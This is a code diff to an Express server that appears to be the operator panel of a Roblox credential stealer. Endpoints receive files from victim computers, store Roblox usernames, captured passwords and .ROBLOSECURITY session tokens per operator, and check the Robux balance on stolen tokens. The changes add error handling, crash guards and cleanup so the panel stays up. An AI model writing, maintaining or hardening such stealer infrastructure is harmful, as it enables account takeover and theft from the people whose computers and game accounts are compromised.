@@ -471,12 +471,13 @@ app.post('/upload', upload.array('files'), async (req, res) => {
 //  API — Update Roblox details for files
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.post('/update-roblox', async (req, res) => {
-  const { computerName, robloxUser, fakePassword, robloSecurity } = req.body;
-  const operator = (typeof req.body.operator === 'string' && req.body.operator) ? req.body.operator.substring(0, 64) : 'Shonll';
-  const db = await getDb();
+  try {
+    const { computerName, robloxUser, fakePassword, robloSecurity } = req.body;
+    const operator = (typeof req.body.operator === 'string' && req.body.operator) ? req.body.operator.substring(0, 64) : 'Shonll';
+    const db = await getDb();
 
-  // Находим последний файл этого компьютера (оператора)
-  const target = await db.collection('files').findOne(
+    // Находим последний файл этого компьютера (оператора)
+    const target = await db.collection('files').findOne(
     { 'computer.name': computerName, operator: operator },
     { sort: { uploadedAt: -1 } }
   );
@@ -579,6 +580,10 @@ app.post('/update-roblox', async (req, res) => {
     });
     res.json({ success: true });
   }
+  } catch (e) {
+    console.error('Update-roblox error:', e.message);
+    res.status(500).json({ error: 'Ошибка сервера' });
+  }
 });
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -622,12 +627,17 @@ app.get('/files', requireAuth, async (req, res) => {
 //  DELETE file
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.delete('/files/:name', requireAuth, async (req, res) => {
-  const db = await getDb();
-  const user = req.authUser || req.session.user;
-  const doc = await db.collection('files').findOne({ name: req.params.name, operator: user });
-  if (!doc) return res.status(404).json({ error: 'Файл не найден' });
-  await db.collection('files').deleteOne({ _id: doc._id });
-  res.json({ success: true });
+  try {
+    const db = await getDb();
+    const user = req.authUser || req.session.user;
+    const doc = await db.collection('files').findOne({ name: req.params.name, operator: user });
+    if (!doc) return res.status(404).json({ error: 'Файл не найден' });
+    await db.collection('files').deleteOne({ _id: doc._id });
+    res.json({ success: true });
+  } catch (e) {
+    console.error('Delete error:', e.message);
+    res.status(500).json({ error: 'Ошибка удаления' });
+  }
 });
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -753,23 +763,28 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
 
 // POST /robux-check-file — проверка токена конкретного файла
 app.post('/robux-check-file', requireAuth, async (req, res) => {
-  const { filename } = req.body;
-  const user = req.authUser || req.session.user;
-  const db = await getDb();
-  let doc;
-  if (db) {
-    doc = await db.collection('files').findOne({ name: filename, operator: user });
-  } else {
-    doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
-  }
-  if (!doc) return res.status(404).json({ error: 'Файл не найден' });
-  const roblox = doc.roblox || {};
-  if (!roblox.security) return res.json({ valid: false, error: 'Токен не сохранён' });
   try {
-    const rbInfo = await fetchRobuxInfo(roblox.security);
-    res.json(rbInfo);
+    const { filename } = req.body;
+    const user = req.authUser || req.session.user;
+    const db = await getDb();
+    let doc;
+    if (db) {
+      doc = await db.collection('files').findOne({ name: filename, operator: user });
+    } else {
+      doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+    }
+    if (!doc) return res.status(404).json({ error: 'Файл не найден' });
+    const roblox = doc.roblox || {};
+    if (!roblox.security) return res.json({ valid: false, error: 'Токен не сохранён' });
+    try {
+      const rbInfo = await fetchRobuxInfo(roblox.security);
+      res.json(rbInfo);
+    } catch (e) {
+      res.json({ valid: false, error: e.message });
+    }
   } catch (e) {
-    res.json({ valid: false, error: e.message });
+    console.error('Robux-check-file error:', e.message);
+    res.status(500).json({ error: 'Ошибка сервера' });
   }
 });
 
@@ -2216,6 +2231,27 @@ app.use((err, req, res, next) => {
     res.status(500).json({ error: 'Внутренняя ошибка сервера' });
   }
 });
+
+// ── Global error handlers — prevent random crashes ──────────────────────────
+process.on('unhandledRejection', (reason) => {
+  console.error('Unhandled Rejection:', reason instanceof Error ? reason.message : reason);
+});
+process.on('uncaughtException', (err) => {
+  console.error('Uncaught Exception:', err.message);
+});
+
+// ── Periodic cleanup — prevent memory leaks ────────────────────────────────
+setInterval(() => {
+  // Remove stale SSE clients (closed connections)
+  sseClients = sseClients.filter(c => {
+    try { return c.writable && !c.destroyed; } catch { return false; }
+  });
+  // Clean country cache (max 500 entries)
+  if (countryCache.size > 500) {
+    const keys = [...countryCache.keys()].slice(0, 100);
+    keys.forEach(k => countryCache.delete(k));
+  }
+}, 60000);
 
 // ── Start ─────────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 25565;
